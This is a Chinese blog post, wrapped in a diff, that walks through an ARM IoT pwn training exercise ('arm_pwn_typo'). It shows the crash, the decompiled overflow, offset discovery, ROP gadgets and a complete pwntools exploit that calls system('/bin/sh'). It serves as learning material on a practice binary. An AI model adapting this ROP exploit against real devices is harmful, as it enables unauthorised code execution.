@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="换了m1 的mac感觉还不错，就是x64下的pwn有点麻烦。环境搭建好之后，刚好找到了一个异构pwn技能栈的仓库，然后就拿过来熟悉一下。 项目地址：https:&#x2F;&#x2F;github.com&#x2F;ReAbout&#x2F;pwn-exercise-iot  iot安全学习之异构pwn技能栈linux_arm_stackarm_pwn_typo 知识点：ARM函数调用约定 &amp; ARM RoP &amp; AR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IOT安全学习之异构pwn技能栈">
+<meta property="og:url" content="http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/index.html">
+<meta property="og:site_name" content="z1r0&#39;s blog">
+<meta property="og:description" content="换了m1 的mac感觉还不错，就是x64下的pwn有点麻烦。环境搭建好之后，刚好找到了一个异构pwn技能栈的仓库，然后就拿过来熟悉一下。 项目地址：https:&#x2F;&#x2F;github.com&#x2F;ReAbout&#x2F;pwn-exercise-iot  iot安全学习之异构pwn技能栈linux_arm_stackarm_pwn_typo 知识点：ARM函数调用约定 &amp; ARM RoP &amp; AR">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-16T06:23:48.000Z">
+<meta property="article:modified_time" content="2022-06-27T10:27:31.247Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>IOT安全学习之异构pwn技能栈</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/26/%E8%B7%AF%E7%94%B1%E5%99%A8D-Link-dir816-A2-UART%E6%8E%A5%E5%8F%A3%E8%B0%83%E8%AF%95%E8%8E%B7%E5%8F%96shell/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/04/11/vm-pwn%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&text=IOT安全学习之异构pwn技能栈"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&is_video=false&description=IOT安全学习之异构pwn技能栈"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IOT安全学习之异构pwn技能栈&body=Check out this article: http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&name=IOT安全学习之异构pwn技能栈&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&t=IOT安全学习之异构pwn技能栈"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88"><span class="toc-number">1.</span> <span class="toc-text">iot安全学习之异构pwn技能栈</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-arm-stack"><span class="toc-number">1.1.</span> <span class="toc-text">linux_arm_stack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#arm-pwn-typo"><span class="toc-number">1.1.1.</span> <span class="toc-text">arm_pwn_typo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arm-pwn-websrv"><span class="toc-number">1.1.2.</span> <span class="toc-text">arm_pwn_websrv</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        IOT安全学习之异构pwn技能栈
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-16T06:23:48.000Z" itemprop="datePublished">2022-06-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/">路由器</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/IOT/" rel="tag">IOT</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>换了m1 的mac感觉还不错，就是x64下的pwn有点麻烦。环境搭建好之后，刚好找到了一个异构pwn技能栈的仓库，然后就拿过来熟悉一下。</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ReAbout/pwn-exercise-iot">https://github.com/ReAbout/pwn-exercise-iot</a></p>
+</blockquote>
+<h1 id="iot安全学习之异构pwn技能栈"><a href="#iot安全学习之异构pwn技能栈" class="headerlink" title="iot安全学习之异构pwn技能栈"></a>iot安全学习之异构pwn技能栈</h1><h2 id="linux-arm-stack"><a href="#linux-arm-stack" class="headerlink" title="linux_arm_stack"></a>linux_arm_stack</h2><h3 id="arm-pwn-typo"><a href="#arm-pwn-typo" class="headerlink" title="arm_pwn_typo"></a>arm_pwn_typo</h3><blockquote>
+<p>知识点：ARM函数调用约定 &amp; ARM RoP &amp; ARM ret2syscall</p>
+</blockquote>
+<p>保护只开了一个NX，运行一下程序并手动测试了一下，发现了栈溢出漏洞。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  typo qemu-arm typo </span><br><span class="line">Let<span class="number">&#x27;</span>s Do Some Typing Exercise~</span><br><span class="line">Press Enter to get start;</span><br><span class="line">Input ~ <span class="keyword">if</span> you want to quit</span><br><span class="line"></span><br><span class="line">------Begin------</span><br><span class="line">wrist</span><br><span class="line">wrist</span><br><span class="line"></span><br><span class="line">preparation</span><br><span class="line">aa</span><br><span class="line">E.r.r.o.r.</span><br><span class="line"></span><br><span class="line">loose</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">qemu: uncaught target signal <span class="number">11</span> (Segmentation fault) - core dumped</span><br><span class="line">[<span class="number">1</span>]    <span class="number">210306</span> segmentation <span class="title function_">fault</span> <span class="params">(core dumped)</span>  qemu-arm typo</span><br></pre></td></tr></table></figure>
+
+<p>还是进ida分析一下，去了符号表逆向分析有点麻烦，最终发现8d24就是漏洞函数。v6是输入点，并没有对其进行限制</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_8D24</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">112</span>]; <span class="comment">// [sp+Ch] [bp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_20AF0(v6, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">  sub_221B0(<span class="number">0</span>, v6, <span class="number">512</span>);</span><br><span class="line">  v1 = sub_1F800(a1);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_1F860(a1, v6, v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = sub_1F800(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == sub_1F800(v6) - <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] == <span class="number">126</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>动态调试分析一下需要多少个字符可以覆盖到ret，先利用patternoffest生成随机数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  typo python2 patt.py -c -l <span class="number">300</span> -f content</span><br><span class="line">[*] Create pattern <span class="built_in">string</span> contains <span class="number">300</span> characters</span><br><span class="line">ok!</span><br><span class="line">[+] output to content</span><br><span class="line">ok!</span><br><span class="line">[+] take time: <span class="number">0.0002</span> s</span><br><span class="line">➜  typo ls</span><br><span class="line">content  <span class="built_in">exp</span>.py  patt.py  typo</span><br><span class="line">➜  typo cat content </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9</span><br></pre></td></tr></table></figure>
+
+<p>然后gdb动态调试看一下pc被覆盖的值，然后把偏移再利用patternoffest算出来即可。这里就不放详细步骤了，前面的iot学习已经写了很多次了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  typo python2 patt.py -s <span class="number">0x64413764</span> -f content </span><br><span class="line">[*] Create pattern <span class="built_in">string</span> contains <span class="number">1024</span> characters</span><br><span class="line">ok!</span><br><span class="line"></span><br><span class="line">[+] Possible match at offset <span class="number">112</span> (adjusted another-endian)</span><br><span class="line">[+] take time: <span class="number">0.0005</span> s</span><br></pre></td></tr></table></figure>
+
+<p>偏移为112，我们只需要再布置一下rop链即可。先找一下system函数，在ida里面利用字符串寻找&#x2F;bin&#x2F;sh接着交叉引用查看函数，就可以看到函数，跟进就可以发现就是需要的system函数。因为是去符号表的，所以看上去不是很理解，但有没有发现和do_system很像。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_10BA8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+A4h] [bp-ACh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">42</span>]; <span class="comment">// [sp+A8h] [bp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v9[<span class="number">32</span>] = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  sub_20AF0(v9, <span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_A2450 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_23E44(&amp;dword_A2450, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_A2454++ == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sub_315C8(<span class="number">2</span>, &amp;v8, &amp;unk_A24E4) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --dword_A2454;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( sub_315C8(<span class="number">3</span>, &amp;v8, &amp;unk_A2458) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = ((<span class="type">int</span> (*)(<span class="type">void</span>))sub_A6D0)();</span><br><span class="line">        v3 = *(_DWORD *)(v1 + *(_DWORD *)(v2 + <span class="number">69228</span>));</span><br><span class="line">        dword_A2454 = v4 - <span class="number">1</span>;</span><br><span class="line">        v5 = sub_315C8(<span class="number">2</span>, &amp;unk_A24E4, <span class="number">0</span>);</span><br><span class="line">        v6 = sub_A6D0(v5);</span><br><span class="line">        *(_DWORD *)(v6 + *(_DWORD *)(v7 + <span class="number">69496</span>)) = v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(<span class="number">0xFFFF0FC0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;bin&#x2F;sh上一步已经提到了，接下来剩下最关键的一步了，运行system(“&#x2F;bin&#x2F;sh”); mips第一参是r0，所以找到pop_r0这种寄存器即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  typo ROPgadget --binary typo --only <span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x00008d1c</span> : pop &#123;fp, pc&#125;</span><br><span class="line"><span class="number">0x00020904</span> : pop &#123;r0, r4, pc&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有一个pop_r0_r4的链子，我们可以借助这个来实现system(“&#x2F;bin&#x2F;sh”)；r0压入&#x2F;bin&#x2F;sh，r4随便一个值就行，最后的ret压成system即可。exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./typo&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">pop_r0_r4_pc = <span class="number">0x00020904</span></span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x0006c384</span></span><br><span class="line">system_addr = <span class="number">0x10BA8</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span> + p32(pop_r0_r4_pc) + p32(bin_sh) + p32(<span class="number">0</span>) + p32(system_addr)</span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="arm-pwn-websrv"><a href="#arm-pwn-websrv" class="headerlink" title="arm_pwn_websrv"></a>arm_pwn_websrv</h3><blockquote>
+<p>知识点：qemu调试子进程——Patch fork &amp; 反弹shellcode</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88"><span class="toc-number">1.</span> <span class="toc-text">iot安全学习之异构pwn技能栈</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-arm-stack"><span class="toc-number">1.1.</span> <span class="toc-text">linux_arm_stack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#arm-pwn-typo"><span class="toc-number">1.1.1.</span> <span class="toc-text">arm_pwn_typo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arm-pwn-websrv"><span class="toc-number">1.1.2.</span> <span class="toc-text">arm_pwn_websrv</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&text=IOT安全学习之异构pwn技能栈"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/06/16/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E6%9E%84pwn%E6%8A%80%E8%83%BD%E6%A0%88/&title=IOT安全学习之异构pwn技能栈"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
